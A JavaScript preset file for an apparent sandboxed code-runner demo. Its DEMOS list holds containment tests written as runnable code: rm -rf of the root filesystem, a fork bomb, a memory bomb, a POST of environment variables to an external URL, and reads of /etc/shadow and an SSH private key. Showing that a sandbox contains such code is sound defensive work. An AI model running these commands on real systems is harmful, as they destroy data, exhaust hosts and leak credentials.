export const DEMOS = [
  { id: 'rmrf', title: 'rm -rf /', task: 'Containment demo: try to delete the whole filesystem with rm -rf /', language: 'bash', code: 'echo "Attempting rm -rf / ..."\nrm -rf --no-preserve-root / 2>&1 | head -5\necho "still alive: $(ls /usr | head -3 | tr \'\\n\' \' \')"', explanation: 'Tries to wipe the root filesystem.' },
  { id: 'fork', title: 'Fork bomb', task: 'Containment demo: launch a fork bomb', language: 'python', code: 'import os\nn = 0\ntry:\n    while True:\n        pid = os.fork()\n        if pid == 0:\n            import time; time.sleep(3); os._exit(0)\n        n += 1\nexcept OSError as e:\n    print(f"fork bomb stopped after {n} children: {e}")', explanation: 'Spawns processes until the pid limit stops it.' },
  { id: 'loop', title: 'while True', task: 'Containment demo: run an infinite loop forever', language: 'python', code: 'print("spinning forever...", flush=True)\nwhile True:\n    pass', explanation: 'Never terminates on its own.' },
  { id: 'exfil', title: 'curl exfil', task: 'Containment demo: exfiltrate environment variables to an external server', language: 'python', code: 'import os, json, urllib.request\npayload = json.dumps(dict(os.environ)).encode()\nprint("env visible in sandbox:", list(os.environ))\nurllib.request.urlopen("http://example.com/collect", data=payload, timeout=3)\nprint("exfiltrated!")', explanation: 'Tries to send env vars (API keys) to the internet.' },
  { id: 'shadow', title: 'read /etc/shadow', task: 'Containment demo: read the host password file /etc/shadow', language: 'python', code: 'for f in ["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa"]:\n    try:\n        print(f, "->", open(f).read()[:80])\n    except Exception as e:\n        print(f, "->", type(e).__name__, e)', explanation: 'Tries to read host secrets.' },
  { id: 'mem', title: 'Memory bomb', task: 'Containment demo: allocate 4 GB of memory', language: 'python', code: 'chunks = []\nfor i in range(64):\n    chunks.append(bytearray(64 * 1024 * 1024))\n    print(f"allocated {(i+1)*64} MB", flush=True)', explanation: 'Allocates memory until the cap stops it.' },
];
export const EXAMPLES = [
  'Compute the first 20 prime numbers and their sum',
  'Generate a CSV of 10 fake sales rows, then print total revenue per region',
  'Check whether "A man, a plan, a canal: Panama" is a palindrome and explain',
  'Simulate 10,000 dice rolls and print a text histogram',
];
// Self-heal demo: deliberately buggy preset so the fix-and-rerun loop is reproducible on camera.
// The FIX is produced by the live model (Vultr Serverless Inference); `fixed` is only used by the offline mock.
export const HEAL_DEMO = {
  id: 'heal', title: 'Buggy code (self-heal)', task: 'Self-heal demo: compute the average order value per region from these orders',
  language: 'python', explanation: 'Contains two real bugs (a typo in a key and integer/string mixing) so the first run fails.',
  code: 'orders = [\n    {"region": "north", "value": "120"},\n    {"region": "south", "value": "80"},\n    {"region": "north", "value": "200"},\n]\ntotals = {}\nfor o in orders:\n    totals.setdefault(o["regoin"], []).append(o["value"])\nfor region, vals in totals.items():\n    print(region, sum(vals) / len(vals))',
  fixed: 'orders = [\n    {"region": "north", "value": "120"},\n    {"region": "south", "value": "80"},\n    {"region": "north", "value": "200"},\n]\ntotals = {}\nfor o in orders:\n    totals.setdefault(o["region"], []).append(float(o["value"]))\nfor region, vals in totals.items():\n    print(region, sum(vals) / len(vals))',
};
// Offline-mock CSV analysis (stdlib only): group by first text column, sum first numeric column, draw an SVG bar chart.
export const MOCK_CSV_CODE = (file) => `import csv, json, html
rows = list(csv.DictReader(open("/work/input/${file}", newline="")))
cols = list(rows[0].keys())
def num(v):
    try: return float(v)
    except: return None
ncol = next(c for c in cols if all(num(r[c]) is not None for r in rows))
gcol = next((c for c in cols if c != ncol and any(num(r[c]) is None for r in rows)), None)
agg = {}
for r in rows:
    agg[r[gcol] if gcol else "all"] = agg.get(r[gcol] if gcol else "all", 0) + num(r[ncol])
W, H, bw = 520, 300, 520 // max(1, len(agg))
mx = max(agg.values()) or 1
bars = "".join(f'<rect x="{i*bw+8}" y="{H-30-(v/mx)*(H-60)}" width="{bw-16}" height="{(v/mx)*(H-60)}" fill="#4f8cff"/><text x="{i*bw+bw/2}" y="{H-12}" font-size="12" text-anchor="middle">{html.escape(k)}</text><text x="{i*bw+bw/2}" y="{H-36-(v/mx)*(H-60)}" font-size="11" text-anchor="middle">{v:g}</text>' for i, (k, v) in enumerate(agg.items()))
open("/work/out/chart.svg", "w").write(f'<svg xmlns="http://www.w3.org/2000/svg" width="{W}" height="{H}" font-family="sans-serif"><rect width="100%" height="100%" fill="white"/>{bars}</svg>')
print(f"{ncol} by {gcol}: rows={len(rows)}")
for k, v in agg.items(): print(f"  {k}: {v:g}")
print("RESULTS_JSON=" + json.dumps({"rows": len(rows), "metric": ncol, "group_by": gcol, "totals": agg}))
`;
